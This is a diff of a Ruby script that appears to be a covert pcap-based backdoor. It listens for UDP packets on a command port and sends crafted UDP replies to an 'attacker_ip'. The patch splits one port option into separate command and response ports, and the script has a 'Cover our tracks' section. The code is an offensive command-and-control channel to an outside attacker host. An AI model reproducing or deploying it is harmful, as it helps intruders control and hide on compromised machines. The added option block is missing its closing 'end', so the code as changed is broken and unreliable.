@@ -30,9 +30,11 @@ optparse = OptionParser.new do |opts|
 		options[:dev] = f
 	end
 	# Optionally sepcifiy the nameserver to query
-	opts.on('-p', '--port PORT', "Port to listen on. Default 8000.") do |f|
-		options[:port] = f
+	opts.on('-p', '--cport PORT', "Port to listen on. Default 8000.") do |f|
+		options[:cport] = f
 	end
+	opts.on('-r', '--rport PORT', "Port to send the responses to. Default 8001") do |f|
+	        options[:rport] = f
 end
 
 optparse.parse!
@@ -40,7 +42,9 @@ optparse.parse!
 # Listening device
 dev = options[:dev]? options[:dev] : Pcap.lookupdev
 # Listening port
-port = options[:port]? options[:port] : 8000
+cport = options[:cport]? options[:cport] : 8000
+# Response port
+rport = options[:rport]? options[:rport] : 8001
 
 # ---------------------------------------------------------
 # Cover our tracks
@@ -80,7 +84,7 @@ end
 
 #cap.loop do |pkt|
 
-cap = Capture.new(:iface => dev, :start => true, :filter => 'udp dst port ' + port.to_s)
+cap = Capture.new(:iface => dev, :start => true, :filter => 'udp dst port ' + cport.to_s)
 
 cap.stream.each do |pkt|
 	packet = Packet.parse pkt
@@ -91,7 +95,7 @@ cap.stream.each do |pkt|
 
 	udp_pkt = UDPPacket.new
 	udp_pkt.udp_src = rand(0xffff - 1024) + 1024
-	udp_pkt.udp_dst = port + 1
+	udp_pkt.udp_dst = rport
 
 	udp_pkt.ip_saddr = local_ip
 	udp_pkt.ip_daddr = attacker_ip
